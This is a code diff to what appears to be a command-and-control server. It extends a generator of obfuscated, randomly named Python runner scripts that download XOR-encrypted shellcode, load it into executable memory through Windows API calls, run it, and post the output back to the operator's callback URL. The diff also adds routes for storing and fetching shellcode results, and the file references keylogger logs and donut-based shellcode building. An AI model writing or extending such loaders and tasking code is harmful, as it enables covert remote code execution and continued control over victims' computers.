@@ -277,7 +277,7 @@ def _obfuscate_code(code):
     return '\n'.join(obfuscated_lines)
 
 
-def _generate_runner_script(shellcode_url, callback_url=None, xor_key=None):
+def _generate_runner_script(shellcode_url, callback_url=None, xor_key=None, task_id=None):
     """Generate the Python runner script that will download and execute shellcode"""
     if xor_key is None:
         raise ValueError("XOR key is required for shellcode encryption")
@@ -297,6 +297,7 @@ def _generate_runner_script(shellcode_url, callback_url=None, xor_key=None):
     main_func_name = generate_random_name()
     url_var_name = generate_random_name()
     key_var_name = generate_random_name()
+    task_id_var_name = generate_random_name()
     data_var_name = generate_random_name()
     key_len_var_name = generate_random_name()
     space_var_name = generate_random_name()
@@ -325,31 +326,65 @@ def {recv_func_name}({url_var_name}):
     {response_var_name}.raise_for_status()
     return {response_var_name}.content
 def {exec_func_name}({encrypted_shellcode_param_name}, {xor_key_param_name}):
-    import threading
     ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
     ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
-    def {run_func_name}():
-        {space_var_name} = ctypes.windll.kernel32.VirtualAlloc(0, len({encrypted_shellcode_param_name}), 0x3000, 0x40)
-        {buff_var_name} = (ctypes.c_char * len({encrypted_shellcode_param_name})).from_buffer_copy({encrypted_shellcode_param_name})
-        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p({space_var_name}), {buff_var_name}, len({encrypted_shellcode_param_name}))
-        {key_len_var_name} = len({xor_key_param_name})
-        for {i_var_name} in range(len({encrypted_shellcode_param_name})):
-            {encrypted_byte_var_name} = ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value
-            {decrypted_byte_var_name} = {encrypted_byte_var_name} ^ {xor_key_param_name}[{i_var_name} % {key_len_var_name}]
-            ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value = {decrypted_byte_var_name}
-        {shellcode_func_var_name} = ctypes.CFUNCTYPE(None)({space_var_name})
-        {shellcode_func_var_name}()
-    threading.Thread(target={run_func_name}).start()
-def {main_func_name}({url_var_name}, {key_var_name}):
+    {space_var_name} = ctypes.windll.kernel32.VirtualAlloc(0, len({encrypted_shellcode_param_name}), 0x3000, 0x40)
+    {buff_var_name} = (ctypes.c_char * len({encrypted_shellcode_param_name})).from_buffer_copy({encrypted_shellcode_param_name})
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p({space_var_name}), {buff_var_name}, len({encrypted_shellcode_param_name}))
+    {key_len_var_name} = len({xor_key_param_name})
+    for {i_var_name} in range(len({encrypted_shellcode_param_name})):
+        {encrypted_byte_var_name} = ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value
+        {decrypted_byte_var_name} = {encrypted_byte_var_name} ^ {xor_key_param_name}[{i_var_name} % {key_len_var_name}]
+        ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value = {decrypted_byte_var_name}
+    {shellcode_func_var_name} = ctypes.CFUNCTYPE(None)({space_var_name})
+    {shellcode_func_var_name}()
+def {main_func_name}({url_var_name}, {key_var_name}, task_id_value):
+    import subprocess
+    import sys
+    import io
+    import contextlib
     try:
-        {encrypted_shellcode_param_name} = {recv_func_name}({url_var_name})
-        {exec_func_name}({encrypted_shellcode_param_name}, {key_var_name})
+        # Capture stdout and stderr
+        output_buffer = io.StringIO()
+        with contextlib.redirect_stdout(output_buffer), contextlib.redirect_stderr(output_buffer):
+            {encrypted_shellcode_param_name} = {recv_func_name}({url_var_name})
+            {exec_func_name}({encrypted_shellcode_param_name}, {key_var_name})
+
+        captured_output = output_buffer.getvalue()
+
+        # Send captured output back to callback URL
+        try:
+            import requests
+            requests.post("{callback_url}", json={{
+                "agent_id": "unknown",
+                "task_id": task_id_value,
+                "status": "success",
+                "message": "Shellcode executed successfully",
+                "output": captured_output,
+                "timestamp": "unknown"
+            }}, timeout=5, verify=False)
+        except Exception as e:
+            print(f"Failed to send output: {{e}}")
+
     except Exception as e:
-        pass
+        try:
+            # Send error back to callback URL
+            import requests
+            requests.post("{callback_url}", json={{
+                "agent_id": "unknown",
+                "task_id": task_id_value,
+                "status": "error",
+                "message": str(e),
+                "output": "",
+                "timestamp": "unknown"
+            }}, timeout=5, verify=False)
+        except Exception as e:
+            print(f"Failed to send error: {{e}}")
 if __name__ == "__main__":
     {url_var_name} = "{shellcode_url}"
     {key_var_name} = {xor_key!r}
-    {main_func_name}({url_var_name}, {key_var_name})
+    task_id_value = {task_id}
+    {main_func_name}({url_var_name}, {key_var_name}, task_id_value)
 """
     return script
 
@@ -360,21 +395,22 @@ def init_api_routes(app, socketio):
         try:
             if not request.is_json:
                 return jsonify({"status": "error", "message": "JSON data required"}), 400
-            
+
             data = request.get_json()
+            app.logger.info(f"Received shellcode output data: {data}")
             agent_id = data.get('agent_id')
             status = data.get('status')
             message = data.get('message')
             output = data.get('output', '')
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
-            
+
             if not agent_id or not status:
                 return jsonify({"status": "error", "message": "agent_id and status required"}), 400
-            
+
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
-            
-            # Ensure the shellcode_outputs table exists
+
+            # Ensure the shellcode_outputs table exists and has task_id column
             c.execute('''
                 CREATE TABLE IF NOT EXISTS shellcode_outputs (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -385,14 +421,21 @@ def init_api_routes(app, socketio):
                     timestamp TEXT NOT NULL
                 )
             ''')
-            
-            c.execute('''INSERT INTO shellcode_outputs (agent_id, status, message, output, timestamp)
-                         VALUES (?, ?, ?, ?, ?)''',
-                      (agent_id, status, message, output, timestamp))
-            
+
+            # Add task_id column if it doesn't exist
+            try:
+                c.execute("ALTER TABLE shellcode_outputs ADD COLUMN task_id INTEGER")
+            except sqlite3.OperationalError:
+                # Column already exists, ignore error
+                pass
+
+            c.execute('''INSERT INTO shellcode_outputs (agent_id, task_id, status, message, output, timestamp)
+                         VALUES (?, ?, ?, ?, ?, ?)''',
+                      (agent_id, data.get('task_id'), status, message, output, timestamp))
+
             conn.commit()
             conn.close()
-            
+
             # Notify clients via websocket
             socketio.emit('shellcode_output', {
                 'agent_id': agent_id,
@@ -401,11 +444,54 @@ def init_api_routes(app, socketio):
                 'output': output,
                 'timestamp': timestamp
             })
-            
+
             return jsonify({"status": "success"})
         except Exception as e:
             app.logger.error(f"Error processing shellcode output: {str(e)}")
             return jsonify({"status": "error", "message": str(e)}), 500
+
+    @app.route('/api/shellcode_outputs/<string:agent_id>', methods=['GET'])
+    @login_required
+    def get_shellcode_outputs(agent_id):
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+
+            # Ensure the shellcode_outputs table exists
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS shellcode_outputs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    agent_id TEXT NOT NULL,
+                    task_id INTEGER,
+                    status TEXT NOT NULL,
+                    message TEXT,
+                    output TEXT,
+                    timestamp TEXT NOT NULL
+                )
+            ''')
+
+            c.execute('''
+                SELECT id, task_id, status, message, output, timestamp FROM shellcode_outputs
+                WHERE agent_id=?
+                ORDER BY timestamp DESC
+                LIMIT 50
+            ''', (agent_id,))
+            rows = c.fetchall()
+            conn.close()
+
+            outputs = [{
+                'id': row[0],
+                'task_id': row[1],
+                'status': row[2],
+                'message': row[3],
+                'output': row[4],
+                'timestamp': row[5]
+            } for row in rows]
+
+            return jsonify({'status': 'success', 'outputs': outputs})
+        except Exception as e:
+            app.logger.error(f"Error fetching shellcode outputs: {str(e)}")
+            return jsonify({'status': 'error', 'message': str(e)}), 500
 
     # New endpoint to fetch recent keylogger logs for an agent
     @app.route('/api/keylogger_logs/<string:agent_id>', methods=['GET'])
@@ -1120,7 +1206,8 @@ def init_api_routes(app, socketio):
                 # Build donut command
                 args_str = str(args) if args else ''
 
-                cmd = f"docker run --rm -v {temp_dir}:/workdir donut -e {entropy} -a {arch} -o /workdir/{output_name}.bin -f 1"
+                # Properly quote the volume mount path to handle spaces and special characters
+                cmd = f'docker run --rm -v "{temp_dir}:/workdir" donut -e {entropy} -a {arch} -o /workdir/{output_name}.bin -f 1'
 
                 if args_str:
                     cmd += f' -p "{args_str}"'
@@ -1194,54 +1281,75 @@ def init_api_routes(app, socketio):
             conn.close()
             server_url = row[0] if row else request.url_root.rstrip('/')
             
-            # Generate shellcode URL
-            shellcode_url = f"{server_url}/api/download_shellcode/{shellcode_name}"
-
-            # Generate runner script with XOR key
-            callback_url = f"{server_url}/api/shellcode_output"
-            runner_content = _generate_runner_script(shellcode_url, callback_url, xor_key)
-            runner_name = f"runner_{uuid.uuid4().hex[:8]}.py"
-            runners_dir = os.path.join(app.root_path, 'runners')
-            os.makedirs(runners_dir, exist_ok=True)
-            runner_path = os.path.join(runners_dir, runner_name)
-
-            with open(runner_path, 'w') as f:
-                f.write(runner_content)
-                
-            runner_url = f"{server_url}/api/download_runner/{runner_name}"
-            
-            # Create task for agent
+            # Create task for agent first to get task_id
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
-            
+
             # First check if identical task already exists
-            c.execute("""SELECT id FROM tasks 
+            c.execute("""SELECT id FROM tasks
                         WHERE agent_id=? AND task_type='shellcode' AND status='pending'
                         ORDER BY created_at DESC LIMIT 1""",
                     (agent_id,))
             existing_task = c.fetchone()
-            
+
             if existing_task:
                 return jsonify({
                     "status": "error",
                     "message": "A pending shellcode task already exists for this agent"
                 }), 400
 
+            # Generate shellcode URL
+            shellcode_url = f"{server_url}/api/download_shellcode/{shellcode_name}"
+
+            # Create task first to get task_id
+            runner_name = f"runner_{uuid.uuid4().hex[:8]}.py"
+            runner_url = f"{server_url}/api/download_runner/{runner_name}"
+
             task_data = {
                 'runner_url': runner_url,
                 'execution_method': 'download_execute'
             }
-            
+
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                    (None, agent_id, 'shellcode', 
+                    (None, agent_id, 'shellcode',
                     json.dumps(task_data),
-                    'pending', 
-                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
+                    'pending',
+                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                     None))
-            
+
             conn.commit()
             task_id = c.lastrowid
             conn.close()
+
+            # Now generate runner script with the correct task_id
+            callback_url = f"{server_url}/api/shellcode_output"
+            app.logger.info(f"Generating runner script with task_id: {task_id}")
+            runner_content = _generate_runner_script(shellcode_url, callback_url, xor_key, task_id)
+            app.logger.info(f"Runner content length: {len(runner_content)}")
+            runners_dir = os.path.join(app.root_path, 'runners')
+            os.makedirs(runners_dir, exist_ok=True)
+            runner_path = os.path.join(runners_dir, runner_name)
+
+            with open(runner_path, 'w') as f:
+                f.write(runner_content)
+
+            # Debug: read back the file to verify task_id is in it
+            with open(runner_path, 'r') as f:
+                written_content = f.read()
+                app.logger.info(f"Written runner script contains task_id: {'task_id' in written_content}")
+                if 'task_id' in written_content:
+                    # Find the line with task_id
+                    lines = written_content.split('\n')
+                    for line in lines:
+                        if 'task_id' in line:
+                            app.logger.info(f"Task ID line: {line.strip()}")
+                            break
+                # Find the line with task_id_value assignment
+                lines = written_content.split('\n')
+                for line in lines:
+                    if 'task_id_value =' in line:
+                        app.logger.info(f"Task ID value assignment: {line.strip()}")
+                        break
             
             # Clean up temp files
             try:
